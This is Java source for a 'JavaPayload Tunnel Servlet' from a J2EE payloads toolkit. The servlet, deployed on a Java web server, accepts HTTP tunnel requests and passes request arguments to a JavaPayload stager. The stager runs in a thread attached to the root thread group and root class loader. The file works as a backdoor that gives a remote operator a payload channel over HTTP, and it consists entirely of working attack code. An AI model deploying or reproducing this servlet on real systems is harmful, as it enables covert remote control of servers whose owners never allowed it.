/*
 * J2EE Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package j2eepayload.servlet;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PipedInputStream;
import java.io.PipedOutputStream;
import java.net.InetAddress;

import javapayload.stager.LocalTest;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import jtcpfwd.util.PollingHandler;
import jtcpfwd.util.http.HTTPTunnelEngine;
import jtcpfwd.util.http.PollingHandlerFactory;
import jtcpfwd.util.http.StreamingHTTPTunnelEngine;

public class TunnelServlet extends HttpServlet implements PollingHandlerFactory {

	private static final String USAGE_MESSAGE = "<h1>JavaPayload Tunnel Servlet</h1><b>Use the <tt>ServletTunnel</tt> payload to connect to this servlet.</p>";
	private static final long serialVersionUID = 1L;

	protected HTTPTunnelEngine engine;

	public void init() {
		engine = new StreamingHTTPTunnelEngine(this);
	}

	public PollingHandler createHandler(InetAddress remoteAddress, ServletOutputStream out, String createParam) throws Exception {
		if (createParam == null) {
			out.println(USAGE_MESSAGE);
			out.flush();
			return null;
		} 
		PipedOutputStream pos = new PipedOutputStream();
		PollingHandler handler = new PollingHandler(pos, 1048576);
		final String[] args = createParam.split(" ");
		ThreadGroup tg = Thread.currentThread().getThreadGroup();
		while (tg.getParent() != null)
			tg = tg.getParent();
		PayloadRunner runner = new PayloadRunner(tg, new PipedInputStream(pos), handler, args);
		ClassLoader cl = runner.getContextClassLoader();
		while (cl.getParent() != null)
			cl = cl.getParent();
		runner.setContextClassLoader(cl);
		runner.start();
		try {
			runner.join(1000);
		} catch (InterruptedException ex) {
		}
		Exception exception = runner.getException();
		if (exception != null)
			throw exception;
		return handler;
	}

	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		if (!engine.doGet(request, response)) {
			response.getOutputStream().println(USAGE_MESSAGE);
		}
	}

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		engine.doPost(request, response);
	}

	public static class PayloadRunner extends Thread {
		private final String[] args;
		private Exception exception;
		private final InputStream in;
		private final OutputStream out;

		private PayloadRunner(ThreadGroup tg, InputStream in, OutputStream out, String[] args) {
			super(tg, (Runnable) null);
			this.in = in;
			this.out = out;
			this.args = args;
		}

		public void run() {
			try {
				new LocalTest(in, out).bootstrap(args, false);
			} catch (Exception ex) {
				exception = ex;
			}
		}

		public Exception getException() {
			return exception;
		}
	}
}
